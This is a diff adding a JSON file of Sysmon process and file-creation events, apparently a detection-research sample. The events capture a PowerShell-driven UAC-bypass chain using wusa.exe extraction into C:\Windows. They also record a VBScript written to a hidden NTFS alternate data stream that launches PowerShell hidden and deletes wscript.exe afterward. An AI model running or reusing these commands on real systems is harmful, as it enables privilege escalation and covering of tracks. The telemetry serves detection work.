+                    "@Name": "Microsoft-Windows-Sysmon",
+                    "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"
+                },
+                "EventID": {
+                    "@Qualifiers": "",
+                    "#text": "1"
+                },
+                "Version": "5",
+                "Level": "4",
+                "Task": "1",
+                "Opcode": "0",
+                "Keywords": "0x8000000000000000",
+                "TimeCreated": {
+                    "@SystemTime": "2019-05-09 02:52:21.297136+00:00"
+                },
+                "EventRecordID": "11235",
+                "Correlation": {
+                    "@ActivityID": "",
+                    "@RelatedActivityID": ""
+                },
+                "Execution": {
+                    "@ProcessID": "1988",
+                    "@ThreadID": "228"
+                },
+                "Channel": "Microsoft-Windows-Sysmon/Operational",
+                "Computer": "IEWIN7",
+                "Security": {
+                    "@UserID": "S-1-5-18"
+                }
+            },
+            "EventData": {
+                "Data": [
+                    {
+                        "@Name": "RuleName"
+                    },
+                    {
+                        "@Name": "UtcTime",
+                        "#text": "2019-05-09 02:52:21.234"
+                    },
+                    {
+                        "@Name": "ProcessGuid",
+                        "#text": "{365abb72-95e5-5cd3-0000-001033750f00}"
+                    },
+                    {
+                        "@Name": "ProcessId",
+                        "#text": "2364"
+                    },
+                    {
+                        "@Name": "Image",
+                        "#text": "C:\\Windows\\System32\\wusa.exe"
+                    },
+                    {
+                        "@Name": "FileVersion",
+                        "#text": "6.1.7600.16385 (win7_rtm.090713-1255)"
+                    },
+                    {
+                        "@Name": "Description",
+                        "#text": "Windows Update Standalone Installer"
+                    },
+                    {
+                        "@Name": "Product",
+                        "#text": "Microsoft\u00ae Windows\u00ae Operating System"
+                    },
+                    {
+                        "@Name": "Company",
+                        "#text": "Microsoft Corporation"
+                    },
+                    {
+                        "@Name": "CommandLine",
+                        "#text": "\"C:\\Windows\\system32\\wusa.exe\"  C:\\Users\\IEUser\\AppData\\Local\\Temp\\oz5ctxorxp4.tmp /extract:C:\\Windows /quiet"
+                    },
+                    {
+                        "@Name": "CurrentDirectory",
+                        "#text": "C:\\Users\\IEUser\\AppData\\Local\\Temp\\onedrive\\"
+                    },
+                    {
+                        "@Name": "User",
+                        "#text": "IEWIN7\\IEUser"
+                    },
+                    {
+                        "@Name": "LogonGuid",
+                        "#text": "{365abb72-94cd-5cd3-0000-0020dd3a0100}"
+                    },
+                    {
+                        "@Name": "LogonId",
+                        "#text": "0x0000000000013add"
+                    },
+                    {
+                        "@Name": "TerminalSessionId",
+                        "#text": "1"
+                    },
+                    {
+                        "@Name": "IntegrityLevel",
+                        "#text": "Medium"
+                    },
+                    {
+                        "@Name": "Hashes",
+                        "#text": "SHA1=B94D16ED6A439CFE591E7A20627F3033E71A10E2,MD5=8CBD6FDACDCC0ED48BAF607226D6D0C9,SHA256=CB128FAF0430CE1A90412546E90A3B6446C74887D696485CC2C3AAF10714A428,IMPHASH=DDC91ECD17D943E2EE26D62FC9A4FB0C"
+                    },
+                    {
+                        "@Name": "ParentProcessGuid",
+                        "#text": "{365abb72-9570-5cd3-0000-00103fc90a00}"
+                    },
+                    {
+                        "@Name": "ParentProcessId",
+                        "#text": "1900"
+                    },
+                    {
+                        "@Name": "ParentImage",
+                        "#text": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+                    },
+                    {
+                        "@Name": "ParentCommandLine",
+                        "#text": "powershell"
+                    }
+                ]
+            }
+        }
+    },
+    {
+        "Event": {
+            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
+            "System": {
+                "Provider": {
+                    "@Name": "Microsoft-Windows-Sysmon",
+                    "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"
+                },
+                "EventID": {
+                    "@Qualifiers": "",
+                    "#text": "1"
+                },
+                "Version": "5",
+                "Level": "4",
+                "Task": "1",
+                "Opcode": "0",
+                "Keywords": "0x8000000000000000",
+                "TimeCreated": {
+                    "@SystemTime": "2019-05-09 02:52:21.594011+00:00"
+                },
+                "EventRecordID": "11237",
+                "Correlation": {
+                    "@ActivityID": "",
+                    "@RelatedActivityID": ""
+                },
+                "Execution": {
+                    "@ProcessID": "1988",
+                    "@ThreadID": "228"
+                },
+                "Channel": "Microsoft-Windows-Sysmon/Operational",
+                "Computer": "IEWIN7",
+                "Security": {
+                    "@UserID": "S-1-5-18"
+                }
+            },
+            "EventData": {
+                "Data": [
+                    {
+                        "@Name": "RuleName"
+                    },
+                    {
+                        "@Name": "UtcTime",
+                        "#text": "2019-05-09 02:52:21.422"
+                    },
+                    {
+                        "@Name": "ProcessGuid",
+                        "#text": "{365abb72-95e5-5cd3-0000-0010e1890f00}"
+                    },
+                    {
+                        "@Name": "ProcessId",
+                        "#text": "2800"
+                    },
+                    {
+                        "@Name": "Image",
+                        "#text": "C:\\Windows\\System32\\wusa.exe"
+                    },
+                    {
+                        "@Name": "FileVersion",
+                        "#text": "6.1.7600.16385 (win7_rtm.090713-1255)"
+                    },
+                    {
+                        "@Name": "Description",
+                        "#text": "Windows Update Standalone Installer"
+                    },
+                    {
+                        "@Name": "Product",
+                        "#text": "Microsoft\u00ae Windows\u00ae Operating System"
+                    },
+                    {
+                        "@Name": "Company",
+                        "#text": "Microsoft Corporation"
+                    },
+                    {
+                        "@Name": "CommandLine",
+                        "#text": "\"C:\\Windows\\system32\\wusa.exe\"  C:\\Users\\IEUser\\AppData\\Local\\Temp\\oz5ctxorxp4.tmp /extract:C:\\Windows /quiet"
+                    },
+                    {
+                        "@Name": "CurrentDirectory",
+                        "#text": "C:\\Windows\\system32\\"
+                    },
+                    {
+                        "@Name": "User",
+                        "#text": "IEWIN7\\IEUser"
+                    },
+                    {
+                        "@Name": "LogonGuid",
+                        "#text": "{365abb72-94cd-5cd3-0000-0020a43a0100}"
+                    },
+                    {
+                        "@Name": "LogonId",
+                        "#text": "0x0000000000013aa4"
+                    },
+                    {
+                        "@Name": "TerminalSessionId",
+                        "#text": "1"
+                    },
+                    {
+                        "@Name": "IntegrityLevel",
+                        "#text": "High"
+                    },
+                    {
+                        "@Name": "Hashes",
+                        "#text": "SHA1=B94D16ED6A439CFE591E7A20627F3033E71A10E2,MD5=8CBD6FDACDCC0ED48BAF607226D6D0C9,SHA256=CB128FAF0430CE1A90412546E90A3B6446C74887D696485CC2C3AAF10714A428,IMPHASH=DDC91ECD17D943E2EE26D62FC9A4FB0C"
+                    },
+                    {
+                        "@Name": "ParentProcessGuid",
+                        "#text": "{365abb72-9570-5cd3-0000-00103fc90a00}"
+                    },
+                    {
+                        "@Name": "ParentProcessId",
+                        "#text": "1900"
+                    },
+                    {
+                        "@Name": "ParentImage",
+                        "#text": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+                    },
+                    {
+                        "@Name": "ParentCommandLine",
+                        "#text": "powershell"
+                    }
+                ]
+            }
+        }
+    },
+    {
+        "Event": {
+            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
+            "System": {
+                "Provider": {
+                    "@Name": "Microsoft-Windows-Sysmon",
+                    "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"
+                },
+                "EventID": {
+                    "@Qualifiers": "",
+                    "#text": "1"
+                },
+                "Version": "5",
+                "Level": "4",
+                "Task": "1",
+                "Opcode": "0",
+                "Keywords": "0x8000000000000000",
+                "TimeCreated": {
+                    "@SystemTime": "2019-05-09 02:52:23.500261+00:00"
+                },
+                "EventRecordID": "11238",
+                "Correlation": {
+                    "@ActivityID": "",
+                    "@RelatedActivityID": ""
+                },
+                "Execution": {
+                    "@ProcessID": "1988",
+                    "@ThreadID": "228"
+                },
+                "Channel": "Microsoft-Windows-Sysmon/Operational",
+                "Computer": "IEWIN7",
+                "Security": {
+                    "@UserID": "S-1-5-18"
+                }
+            },
+            "EventData": {
+                "Data": [
+                    {
+                        "@Name": "RuleName"
+                    },
+                    {
+                        "@Name": "UtcTime",
+                        "#text": "2019-05-09 02:52:23.484"
+                    },
+                    {
+                        "@Name": "ProcessGuid",
+                        "#text": "{365abb72-95e7-5cd3-0000-001046950f00}"
+                    },
+                    {
+                        "@Name": "ProcessId",
+                        "#text": "2812"
+                    },
+                    {
+                        "@Name": "Image",
+                        "#text": "C:\\Windows\\System32\\cmd.exe"
+                    },
+                    {
+                        "@Name": "FileVersion",
+                        "#text": "6.1.7601.17514 (win7sp1_rtm.101119-1850)"
+                    },
+                    {
+                        "@Name": "Description",
+                        "#text": "Windows Command Processor"
+                    },
+                    {
+                        "@Name": "Product",
+                        "#text": "Microsoft\u00ae Windows\u00ae Operating System"
+                    },
+                    {
+                        "@Name": "Company",
+                        "#text": "Microsoft Corporation"
+                    },
+                    {
+                        "@Name": "CommandLine",
+                        "#text": "\"C:\\Windows\\system32\\cmd.exe\"  /C \"echo Dim objShell:Dim oFso:Set oFso = CreateObject(\"Scripting.FileSystemObject\"):Set objShell = WScript.CreateObject(\"WScript.Shell\"):command = \"powershell.exe\":objShell.Run command, 0:command = \"C:\\Windows\\System32\\cmd.exe /c \"\"start /b \"\"\"\" cmd /c \"\"timeout /t 5 >nul&&del C:\\Windows\\wscript.exe&&del C:\\Windows\\wscript.exe.manifest\"\"\"\"\":objShell.Run command, 0:Set objShell = Nothing > \"C:\\Users\\IEUser\\AppData:tghjx5xz2ky.vbs\"\""
+                    },
+                    {
+                        "@Name": "CurrentDirectory",
+                        "#text": "C:\\Users\\IEUser\\AppData\\Local\\Temp\\onedrive\\"
+                    },
+                    {
+                        "@Name": "User",
+                        "#text": "IEWIN7\\IEUser"
+                    },
+                    {
+                        "@Name": "LogonGuid",
+                        "#text": "{365abb72-94cd-5cd3-0000-0020dd3a0100}"
+                    },
+                    {
+                        "@Name": "LogonId",
+                        "#text": "0x0000000000013add"
+                    },
+                    {
+                        "@Name": "TerminalSessionId",
+                        "#text": "1"
+                    },
+                    {
+                        "@Name": "IntegrityLevel",
+                        "#text": "Medium"
+                    },
+                    {
+                        "@Name": "Hashes",
+                        "#text": "SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5,MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163"
+                    },
+                    {
+                        "@Name": "ParentProcessGuid",
+                        "#text": "{365abb72-9570-5cd3-0000-00103fc90a00}"
+                    },
+                    {
+                        "@Name": "ParentProcessId",
+                        "#text": "1900"
+                    },
+                    {
+                        "@Name": "ParentImage",
+                        "#text": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+                    },
+                    {
+                        "@Name": "ParentCommandLine",
+                        "#text": "powershell"
+                    }
+                ]
+            }
+        }
+    },
+    {
+        "Event": {
+            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
+            "System": {
+                "Provider": {
+                    "@Name": "Microsoft-Windows-Sysmon",
+                    "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"
+                },
+                "EventID": {
+                    "@Qualifiers": "",
+                    "#text": "15"
+                },
+                "Version": "2",
+                "Level": "4",
+                "Task": "15",
+                "Opcode": "0",
+                "Keywords": "0x8000000000000000",
+                "TimeCreated": {
+                    "@SystemTime": "2019-05-09 02:52:23.500261+00:00"
+                },
+                "EventRecordID": "11240",
+                "Correlation": {
+                    "@ActivityID": "",
+                    "@RelatedActivityID": ""
+                },
+                "Execution": {
+                    "@ProcessID": "1988",
+                    "@ThreadID": "228"
+                },
+                "Channel": "Microsoft-Windows-Sysmon/Operational",
+                "Computer": "IEWIN7",
+                "Security": {
+                    "@UserID": "S-1-5-18"
+                }
+            },
+            "EventData": {
+                "Data": [
+                    {
+                        "@Name": "RuleName"
+                    },
+                    {
+                        "@Name": "UtcTime",
+                        "#text": "2019-05-09 02:52:23.500"
+                    },
+                    {
+                        "@Name": "ProcessGuid",
+                        "#text": "{365abb72-95e7-5cd3-0000-001046950f00}"
+                    },
+                    {
+                        "@Name": "ProcessId",
+                        "#text": "2812"
+                    },
+                    {
+                        "@Name": "Image",
+                        "#text": "C:\\Windows\\system32\\cmd.exe"
+                    },
+                    {
+                        "@Name": "TargetFilename",
+                        "#text": "C:\\Users\\IEUser\\AppData"
+                    },
+                    {
+                        "@Name": "CreationUtcTime",
+                        "#text": "2018-01-03 01:21:25.726"
+                    },
+                    {
+                        "@Name": "Hash",
+                        "#text": "Unknown"
+                    }
+                ]
+            }
+        }
+    },
+    {
+        "Event": {
+            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
+            "System": {
+                "Provider": {
+                    "@Name": "Microsoft-Windows-Sysmon",
+                    "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"
+                },
+                "EventID": {
+                    "@Qualifiers": "",
+                    "#text": "11"
+                },
+                "Version": "2",
+                "Level": "4",
+                "Task": "11",
+                "Opcode": "0",
+                "Keywords": "0x8000000000000000",
+                "TimeCreated": {
+                    "@SystemTime": "2019-05-09 02:52:23.500261+00:00"
+                },
+                "EventRecordID": "11241",
+                "Correlation": {
+                    "@ActivityID": "",
+                    "@RelatedActivityID": ""
+                },
+                "Execution": {
+                    "@ProcessID": "1988",
+                    "@ThreadID": "228"
+                },
+                "Channel": "Microsoft-Windows-Sysmon/Operational",
+                "Computer": "IEWIN7",
+                "Security": {
+                    "@UserID": "S-1-5-18"
+                }
+            },
+            "EventData": {
+                "Data": [
+                    {
+                        "@Name": "RuleName"
+                    },
+                    {
+                        "@Name": "UtcTime",
+                        "#text": "2019-05-09 02:52:23.500"
+                    },
+                    {
+                        "@Name": "ProcessGuid",
+                        "#text": "{365abb72-95e7-5cd3-0000-001046950f00}"
+                    },
+                    {
+                        "@Name": "ProcessId",
+                        "#text": "2812"
+                    },
+                    {
+                        "@Name": "Image",
+                        "#text": "C:\\Windows\\system32\\cmd.exe"
+                    },
+                    {
+                        "@Name": "TargetFilename",
+                        "#text": "C:\\Users\\IEUser\\AppData:tghjx5xz2ky.vbs"
+                    },
+                    {
+                        "@Name": "CreationUtcTime",
+                        "#text": "2018-01-03 01:21:25.726"
+                    }
+                ]
+            }
+        }
+    },
+    {
+        "Event": {
+            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
+            "System": {
+                "Provider": {
+                    "@Name": "Microsoft-Windows-Sysmon",
+                    "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"
+                },
+                "EventID": {
+                    "@Qualifiers": "",
+                    "#text": "1"
+                },
+                "Version": "5",
+                "Level": "4",
+                "Task": "1",
+                "Opcode": "0",
+                "Keywords": "0x8000000000000000",
+                "TimeCreated": {
+                    "@SystemTime": "2019-05-09 02:52:23.531513+00:00"
+                },
+                "EventRecordID": "11242",
+                "Correlation": {
+                    "@ActivityID": "",
+                    "@RelatedActivityID": ""
+                },
+                "Execution": {
+                    "@ProcessID": "1988",
+                    "@ThreadID": "228"
+                },
+                "Channel": "Microsoft-Windows-Sysmon/Operational",
+                "Computer": "IEWIN7",
+                "Security": {
+                    "@UserID": "S-1-5-18"
+                }
+            },
+            "EventData": {
+                "Data": [
+                    {
+                        "@Name": "RuleName"
+                    },
+                    {
+                        "@Name": "UtcTime",
+                        "#text": "2019-05-09 02:52:23.515"
+                    },
+                    {
+                        "@Name": "ProcessGuid",
+                        "#text": "{365abb72-95e7-5cd3-0000-001004970f00}"
+                    },
+                    {
+                        "@Name": "ProcessId",
+                        "#text": "3784"
+                    },
+                    {
+                        "@Name": "Image",
+                        "#text": "C:\\Windows\\System32\\cmd.exe"
+                    },
+                    {
+                        "@Name": "FileVersion",
+                        "#text": "6.1.7601.17514 (win7sp1_rtm.101119-1850)"
+                    },
+                    {
+                        "@Name": "Description",
+                        "#text": "Windows Command Processor"
+                    },
+                    {
+                        "@Name": "Product",
+                        "#text": "Microsoft\u00ae Windows\u00ae Operating System"
+                    },
+                    {
+                        "@Name": "Company",
+                        "#text": "Microsoft Corporation"
+                    },
+                    {
+                        "@Name": "CommandLine",
+                        "#text": "\"C:\\Windows\\system32\\cmd.exe\"  /C \"C:\\Windows\\wscript.exe \"C:\\Users\\IEUser\\AppData:tghjx5xz2ky.vbs\"\""
+                    },
+                    {
+                        "@Name": "CurrentDirectory",
+                        "#text": "C:\\Users\\IEUser\\AppData\\Local\\Temp\\onedrive\\"
+                    },
+                    {
+                        "@Name": "User",
+                        "#text": "IEWIN7\\IEUser"
+                    },
+                    {
+                        "@Name": "LogonGuid",
+                        "#text": "{365abb72-94cd-5cd3-0000-0020dd3a0100}"
+                    },
+                    {
+                        "@Name": "LogonId",
+                        "#text": "0x0000000000013add"
+                    },
+                    {
+                        "@Name": "TerminalSessionId",
+                        "#text": "1"
+                    },
+                    {
+                        "@Name": "IntegrityLevel",
+                        "#text": "Medium"
+                    },
+                    {
+                        "@Name": "Hashes",
+                        "#text": "SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5,MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163"
+                    },
+                    {
+                        "@Name": "ParentProcessGuid",
+                        "#text": "{365abb72-9570-5cd3-0000-00103fc90a00}"
+                    },
+                    {
+                        "@Name": "ParentProcessId",
+                        "#text": "1900"
+                    },
+                    {
+                        "@Name": "ParentImage",
+                        "#text": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+                    },
+                    {
+                        "@Name": "ParentCommandLine",
+                        "#text": "powershell"
+                    }
+                ]
+            }
+        }
+    }
+]
